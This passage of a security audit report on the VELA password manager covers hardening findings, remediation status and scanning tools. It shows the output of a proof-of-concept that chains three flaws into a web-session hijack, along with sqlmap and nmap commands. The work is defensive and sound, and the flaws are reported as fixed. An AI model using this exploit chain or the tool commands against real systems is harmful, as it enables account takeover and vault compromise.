  non-loopback cleartext bind without `TRUST_PROXY_HEADERS` and wildcard CORS; 0600 perms on
  `paseto.key`/`identity.env` with `create_new(true)`.
- **Server hygiene:** security headers on **every** response incl. errors (`nosniff`, `DENY`,
  strict CSP, `no-referrer`) **[DYN-VERIFIED]**; 413 body cap + 120s timeout on every route
  **[DYN-VERIFIED]**; parameterized SQL throughout (no injection); internal errors masked in
  responses (logged only); 256 MiB default storage quota; WebAuthn UV required + cross-account
  credential uniqueness.
- **Desktop:** vault at rest encrypted via RMS-derived AEAD; atomic tmp+rename writes (0600);
  directory 0700; on-disk-ciphertext test verifies no plaintext leak; clipboard conceal hints;
  no secrets in logs (audit records only ids/types); `ensure_unlocked_since(generation)` re-checked
  after every await in sync; export-path validation blocks path traversal.
- **Extension:** `host_permissions: []`; no `externally_connectable`; native-messaging origins
  scoped to the single VELA extension id; TOTP secret processed ephemerally and replaced by the
  code before forwarding; `authorizeCredentialRequest` cross-checks `data.url` vs `sender.tab.url`,
  active tab, `frameId === 0`, and extension origin.
- **Android:** `allowBackup=false` with explicit exclusion rules; only exported component is
  `VelaAutofillService` (system-only `BIND_AUTOFILL_SERVICE`); release `cleartextTrafficPermitted=false`;
  Keystore biometric RMS wrap with `setUserAuthenticationRequired(true)` +
  `setInvalidatedByBiometricEnrollment(true)` + `AUTH_BIOMETRIC_STRONG` + `CryptoObject`;
  `FLAG_SECURE` on Activities; `EncryptedSharedPreferences` for tokens; Cronet refuses
  cross-host redirects (no Bearer leak); PBKDF2-HMAC-SHA256 210k iterations; no WebView/
  `addJavascriptInterface`; no hardcoded secrets.
- **Dependencies:** no known critical advisories at the pinned versions (`pasetors 0.6.8`,
  `rustls 0.23.40`, `quinn 0.11.9`, `webauthn-rs 0.5.5`, `tar 0.4.46`, `ml-kem 0.3.2`,
  `fips204 0.4.6`, `ed25519-dalek 2.2.0`, `argon2 0.5.3`).

---

## Lower-severity / hardening items

| Component | Location | Issue |
|---|---|---|
| server | `routes.rs:275-278` | `cf-visitor` matched via `contains` (substring) instead of strict JSON parse (only honored from trusted proxies, so bounded) |
| server | `routes.rs:289-319` | `/health` leaks `sled`/`stoolap` backend state unauthenticated **[DYN-VERIFIED]** |
| server | `account/mod.rs:50` | No global account cap (per-IP only) → disk-exhaustion at scale via rotating IPs |
| server | `vault/chunk.rs:18,59`, `oram.rs:68,148` | `chunk_id`/`tree_id` are unvalidated-length `String` paths |
| server | `share/mod.rs:48-58,491-515` | User enumeration: `404 "recipient user not found"` vs `"user has no share key registered"` |
| server | `web_session/mod.rs:437-495` | No exponential backoff on `/web-session/:id/token` (flat 10/min; inconsistent with `/auth/verify`) |
| server | `device/revoke.rs:58-77` | Microsecond revocation race (middleware checks sled sentinel, not SQL `revoked` column) |
| desktop | `commands/biometric.rs:42-48` | `enroll()` always returns `WindowsHello` regardless of platform |
| desktop | `tauri.conf.json:31` | CSP permits plaintext `http://localhost:*` from renderer |
| desktop | `tauri.conf.json:60-62` | `shell.open` unrestricted → renderer can dispatch arbitrary URL schemes (`file://`,`smb://`,…) |
| desktop | `commands/session.rs:636-669` | `reset_vault` wipes on `"DELETE"` alone when locked/no server → trivial data-loss primitive |
| desktop | `commands/totp.rs:4-12` | TOTP oracle callable while vault locked |
| desktop | `commands/vault.rs:281-289` | Modulo bias in `generate_password` (~1.6×10⁻⁸, negligible) |
| desktop | `commands/audit.rs:18-179` | Renderer can forge audit entries (action whitelist, but arbitrary `details`) |
| desktop | `store.rs:296-318` | Legacy plaintext identity-keys file silently re-encrypted (only `warn!`) |
| extension | `manifests/*.json:56,60-69` | Unused `webNavigation` permission; `web_accessible_resources` enables fingerprinting |
| extension | `content/content-script.js:1020` | Unescaped `location.href` hostname in `innerHTML` (URL spec makes `<>"'&` impossible, but inconsistent) |
| extension | `native-messaging/vela-native-messaging-host.py:81-97` | Windows IPC-auth file check is a no-op; capability token is a static bearer with no HMAC/nonce |
| android | `build.gradle.kts:49-54` | No R8/minification → `Log.d` metadata ships in release |
| android | `sync/SyncSettingsStore.kt:84-88` | Server URL accepts `http://` (OS blocks cleartext, but failure is silent) |
| android | `security/SecureClipboard.kt:20` | 30s clipboard exposure window (industry-standard, but the largest live-secret surface) |
| crypto | `shamir.rs:19-56` | Variable-time GF(2⁸) arithmetic (cache-timing leak of RMS bytes; local-only) |
| crypto | `password_kdf.rs:31-33` vs `vela-wasm-bridge/src/lib.rs:19-21` | Argon2id params diverge across platforms (19MiB/2/1 vs 64MiB/3/4) — cross-platform incompatibility + 19MiB/2/1 is OWASP *minimum* for an offline brute-force target |
| crypto | `kdf.rs:58-61` | `chunk_key` context built from `{:?}` debug formatting (unstable contract; raw-bytes vs string divergence between bridges) |
| crypto | `vela-core/src/vault.rs:46-106` | `VaultItem::Debug` prints passwords/CVV/SSN; no `Zeroize` on plaintext `String`s |
| crypto | `password.rs:106` | `getrandom(...).expect(...)` → panic across `extern "C"` is UB |

---

## Remediation priority

1. ~~**Web-session grant (S-1 + S-4).** Bind the grant to the intended approver at `start`
   time; make the fingerprint check unconditional.~~ **Done** — the browser commits
   `approver_user_id` at `start` and only that account may fetch keys or grant; the approver
   apps reject codes missing the fingerprint or link nonce.
   ~~**D-2**~~ **Done** — `rw` now seals per-chunk vault keys (envelope v2), so the browser never
   holds the RMS; ~~**S-2**~~ **Done** — polling requires the browser's registered secret;
   ~~**S-3**~~ **Done** — the recovery cap can no longer be burned on someone else's behalf. `rw`
   still hands over long-lived *vault* keys, so it remains "I trust this device" until vault
   re-keying (§9) exists.
2. ~~**Android `MainActivity` (A-1).**~~ **Done** — an unlock intent must redeem a one-time token
   minted by our own Autofill service. **A-2 is still open**: remove the `com.<x>`→`<x>.com`
   package heuristic.
3. ~~**Desktop auto-lock (D-1).**~~ **Done** — a watchdog thread locks on the deadline and the
   frontends clear the clipboard through their existing lock paths.
4. ~~**macOS biometric (D-3)**~~ **and Windows Hello (D-5, found while fixing it).** **Done** —
   both platforms now verify the user (LocalAuthentication / `UserConsentVerifier`) *before*
   any key is read, and macOS reuses the evaluated context for the Keychain read so there is
   one prompt, not two. Needs one manual pass on real hardware for each.
5. **Crypto JNI (C-1).** *Partially done* — the RMS crosses JNI as bytes now. The long-term
   identity/share private keys still cross (and persist) as strings; that needs opaque handles
   plus a storage-format change.
6. **Extension credential bypass (E-1).** Remove/gate `nativeMessage`/`getNativeMessage`.
7. **AEAD binding (C-2) + authenticated shares (C-3) + `VelaByteBuffer` UB (C-4).**
8. The lower-severity items above are opportunistic hardening.

---

## Tooling (Arch Linux) for ongoing testing

This round used only `cargo build` + `curl` + code reading. For deeper recurring work:

```bash
# Static analysis
pipx install semgrep                  # taint analysis, language-agnostic rules
cargo install cargo-audit cargo-geiger # Rust advisories + unsafe audit
pacman -S nmap ffuf                    # service discovery + endpoint/content fuzzing
paru -S burpsuite owasp-zap            # interactive API proxying (or `pacman -S zaproxy`)
paru -S sqlmap                         # REST API SQLi (here queries are parameterized, so low yield)
```

Suggested cadence: run `cargo audit` in CI; point `semgrep scan --config p/default` at
`serverVELA` and `libVELA`; replay the `curl` checks for S-2/S-3 against staging after every
release.

---

# Phase 2 — Dynamic exploitation & tool-assisted verification

After the initial static review, a second pass ran real tooling (`cargo-audit`, `cargo-geiger`,
`semgrep`, `nmap`, `ffuf`, `sqlmap`, `zaproxy`) and **built working exploits** against the
isolated loopback server instance. The headline result: **S-1 + S-2 + S-4 reproduced
end-to-end** — a complete web-session grant hijack delivering an attacker-chosen RMS to the
victim browser. A number of postulated issues were also *refuted* by dynamic testing (IDOR,
XFF bypass, SQLi), which is recorded below to scope future work.

## Verification matrix

| Check | Tool | Result |
|---|---|---|
| Dependency CVEs (server) | `cargo audit` | clean — only unmaintained `fxhash` (RUSTSEC-2025-0057), `instant` (RUSTSEC-2024-0384), yanked `spin` |
| Dependency CVEs (`libVELA/vela-crypto`) | `cargo audit` | clean (127 deps, 0 advisories) |
| Generic static rules (server / extension / desktop) | `semgrep scan --config p/default` | 0 findings across all three (the domain-specific issues in this report need custom rules) |
| Service fingerprint | `nmap -sV -sC` | axum/hyper HTTP; security headers present on `GET`/`OPTIONS`/`HTTPOptions` probes; rejects `RTSP`/`RPC`/`DNS` probes with 400 |
| **Web-session grant hijack (S-1+S-2+S-4)** | custom PoC | **EXPLOITED — see transcript below** (all three since fixed; the PoC now exits blocked) |
| Cross-user vault access (IDOR) | custom PoC | **BLOCKED** — `GET`/`PUT`/`DELETE` all scoped by `user_id`; cross-user → 404/409 |
| Rate-limit bypass via `X-Forwarded-For` | custom PoC | **BLOCKED** — XFF ignored without `TRUST_PROXY_HEADERS`; spoofed IPs still attribute to real peer |
| `chunk_id` length DoS | manual | bounded by HTTP layer (100 000-char id → `414 URI Too Long` from hyper) |
| Share-recipient enumeration (M1) | manual | **CONFIRMED** — distinct messages `"user not found"` vs `"user has no share key registered"` |
| SQL injection (`/vault/chunk/:id`) | `sqlmap --level=5` | **not injectable** (parameterized queries hold) |
| Active web scan | `zaproxy -cmd` | inconclusive — pure JSON API, nothing to spider (manual + sqlmap + ffuf coverage is stronger here) |

## S-1 + S-2 + S-4 — End-to-end exploit (working PoC)

`exploit_web_session.py` (kept in `/tmp/opencode/`) drives the full attack against the loopback
instance. Registration is unsigned (the server only checks key *lengths*, not validity,
`account/mod.rs:52-53`), so a token is obtained trivially; `web-session/start` is itself
unauthenticated. Transcript:

```
[*] target http://127.0.0.1:8553
======================================================================
[+] ATTACKER registered   user_id=78be4701-ff3f-4f2e-9c0b-1b24b6fb3b10
[+] BROWSER started session  session_id=d01c6a34-7afd-46b8-87d4-6decda1460f1
    (session_id + link_nonce are both in the QR the attacker observed)
----------------------------------------------------------------------
[+] S-4 CONFIRMED: attacker fetched browser keys with its OWN token
    ephemeral_pk matches what browser registered: True
[+] S-1 CONFIRMED: attacker GRANTED the session as user 78be4701-...
    -> session.user_id now overwritten with attacker's id; capsule stored
----------------------------------------------------------------------
[+] S-2 CONFIRMED: unauthenticated poll received capsule
    capsule plaintext = {"v": 1, "mode": "rw", "rms_b64": "zMzM...zMzM="}
[+] Browser would now decrypt with its ephemeral key and adopt the
    ATTACKER-CHOSEN RMS -> permanent full-vault compromise.
[+] S-2 (DoS): second poll returned capsule=null (race-winner deletes it)
======================================================================
[/] EXPLOIT SUCCEEDED: S-1 + S-2 + S-4 reproduced end-to-end.
```

The three findings chain together: **S-4** (any user fetches the browser's KEM public key) →
**S-1** (any authenticated user grants the session, writing their own `user_id`, since the only
anti-phishing binding — `link_nonce` — travels in the same QR) → **S-2** (the browser polls
**unauthenticated** and receives the attacker capsule, which in `rw` mode carries the
attacker-chosen RMS). Pair this with **D-2** (the desktop client seals the real, non-rotating
RMS into `rw` grants) and a single observed QR is permanent full-vault compromise on every
device, past and future.

### Post-fix re-run

The same PoC, kept as `security/exploits/test_s1_grant_hijack.py`, now runs against a session
the browser bound to a victim account and reports the chain broken at every link. The attacker
is handed the *whole* QR — session id and `link_nonce` — and still gets nothing:

```
[+] browser started session 546e1a57-... (QR carries id + link_nonce)
[+] S-4 blocked: /keys -> HTTP 404
[+] S-1 blocked: grant -> HTTP 403
[+] S-2 blocked: poll without the browser secret -> HTTP 401
[+] browser polls fine with its secret: status=pending, no capsule
[/] BLOCKED: the session stayed bound to the account that started it,
    and only the browser that started it can collect the capsule.
```

The capsule race that made S-2 a reliable DoS is closed by the poll secret (registered as a hash
at `start`, never in the QR); D-2 no longer applies because an `rw` grant carries per-chunk vault
keys rather than the RMS.

## Refuted-by-dynamic-testing (defenses confirmed)

Recording these so they are not re-litigated:

- **No IDOR on vault storage.** `GET`/`PUT`/`DELETE /vault/chunk/:id` and
  `GET/PUT /vault/oram/:tree_id/path/:leaf` all key every SQL statement on
  `user_id = session.user_id` (`vault/chunk.rs:26,96,146,212,236`; `vault/oram.rs:81`). A second
  account could not read, overwrite, or delete the first account's chunk (404/404/409).
- **No rate-limit bypass via proxy headers.** With `TRUST_PROXY_HEADERS` unset,
  `net::client_ip` ignores `X-Forwarded-For`/`X-Real-IP` and falls back to the socket peer. 12
  requests with 12 distinct spoofed IPs still triggered the 429 cap on the real peer IP
  (`net.rs:48-90`). Confirms the anti-spoofing defense.
- **No SQL injection.** `sqlmap --level=5 --risk=1` against `/vault/chunk/:id` (an existing
  chunk): "all tested parameters do not appear to be injectable." Consistent with exclusive use
  of `stoolap::params![]` parameterization.
- **Path-length DoS bounded at the HTTP layer.** A 100 000-character `chunk_id` is rejected
  with `414 URI Too Long` before the handler runs. (Note: the bound is hyper's, not an explicit
  application check — fine, but worth a comment in `chunk.rs`/`oram.rs`.)

## Dependency notes

`cargo audit` reports no exploitable advisory on any audited workspace. The three flagged
crates are housekeeping:
- `fxhash 0.2.1` (RUSTSEC-2025-0057, unmaintained) — transitive; replace with `rustc-hash` or
  `ahash` when convenient.
- `instant 0.1.13` (RUSTSEC-2024-0384, unmaintained) — transitive via old UI crates.
- `spin 0.9.8` (yanked) — pin or bump.

## Notes on the tooling

- **semgrep `p/default` is generic** and surfaced nothing; the real issues here (unescaped
  `login.id` in `popup.js`, the `nativeMessage` bypass, the `{:?}` debug-format KDF context in
  `kdf.rs:58`) need custom rules or the manual review already in this report. The custom rule set
  now ships in-repo (see below).
- **ZAP is low-yield for this API** (no HTML/forms to spider); keep it for the web SPA when
  `WEB_DIR` is served. `sqlmap` confirmed the parameterized-query claim directly.
- Reusable commands are captured above; re-run them against staging post-fix to verify
  regressions (especially the S-1 grant-authorization change).

## Project-specific tooling (Phase 2 output)

Generic rulesets found nothing, so the audit produced VELA-specific tooling under `security/`.
All of it **works against this codebase today** — every rule fires on the exact finding it
encodes, with no false positives on the reviewed handlers:

| Artifact | What it checks | Verified against |
|---|---|---|
| `security/scan.py` | **R1** Axum handler with `State<AppState>` but no `AuthSession`; **R2** `{:?}` Debug format in crypto/derivation; **R3** panic operators in `extern "C"` bodies *and* the private helpers they call (one-hop) | R1→`get_session` (S-2, correctly flagged; `health`, `post_register`, `post_initiate`, `post_start`, `post_enrollment_package`, webauthn handlers correctly allowlisted via `public-handlers.txt`); R2→`kdf.rs:59` + bridges (M4); R3→`lib.rs:682` `string_to_ptr` (L2) |
| `security/semgrep/vela.yml` | Canonical 5-rule set (3 Rust + 2 JS) for CI / standard Semgrep | valid YAML, 5 rules |
| `security/semgrep/vela-js.yml` | JS subset that the local osemgrep build can run | popup.js:162/169/174/179 (E-2), background.js:440 (E-1), content-script.js:646/1440 (review) |
| `security/semgrep/public-handlers.txt` | Allowlist of intentionally-public route handlers for R1 | 45+ handlers scanned, only `get_session` reported |
| `security/deny.toml` | cargo-deny policy (yanked `deny`, curated ignore for the two unmaintained transitive crates, license allowlist) | `cargo-deny` schema |
| `security/run-scan.sh` | Orchestrator: semgrep JS + `scan.py` + `cargo-audit` across all 5 Rust workspaces | clean exit semantics; FAIL when findings present |
| `security/zap/` | ZAP context + `run-zap.sh` for **authenticated** active scan of the API data-plane (Bearer token) | documented; ZAP's spider can't crawl a JSON API |

Local caveat discovered while building this: the pip-installed semgrep (`1.172.0`, osemgrep) has
broken `.rs`→rust file targeting for YAML rules (`-l rust` inline works). That's why the Rust
checks live in `scan.py` (dependency-free, always works) and `vela-js.yml` is the local semgrep
subset; `vela.yml` remains the canonical set for a standard Semgrep install/CI.

Usage:

```bash
./security/run-scan.sh            # full local scan (semgrep + scan.py + cargo-audit)
python3 security/scan.py          # Rust checks only
/tmp/opencode/semgrep-venv/bin/semgrep scan --config security/semgrep/vela-js.yml extension/src
(cd serverVELA && cargo deny --workspace check)   # after: cargo install cargo-deny
VELA_BASE=http://127.0.0.1:8553 VELA_TEST_TOKEN=<paseto> security/zap/run-zap.sh
```

Current expected result: `scan.py` reports 3 findings (M4 ×2, L2) — `get_session` is now
allowlisted (S-2 fixed: it authenticates with the browser's poll secret) and the WASM bridge's
`{:?}` derivation is gone with the RMS export (D-2) — semgrep-js reports 7 (E-2 ×4, E-1, 2 review
points), `cargo-audit` clean on all workspaces. **The scan should be green again only after M4,
L2, E-1, E-2 are fixed** — that is the regression gate.

## Exploit artifacts

The PoCs are now permanent regression tests in-repo under `security/exploits/`
(see its README):
- `security/exploits/test_s1_grant_hijack.py` — the S-1+S-4 grant hijack. Hard
  regression gate: exits 0 only while the grant stays bound to the account that
  started the session.
- `security/exploits/test_idor_ratelimit.py` — IDOR (blocked) + XFF-bypass
  (blocked) defence checks; stays green only while the defences hold.
- `security/exploits/run-exploits.sh` — builds/starts a fresh isolated loopback
  instance (temp `DATA_DIR`, teardown via trap), runs both tests.

Run: `./security/exploits/run-exploits.sh` (expected: both green; a red run is a regression).
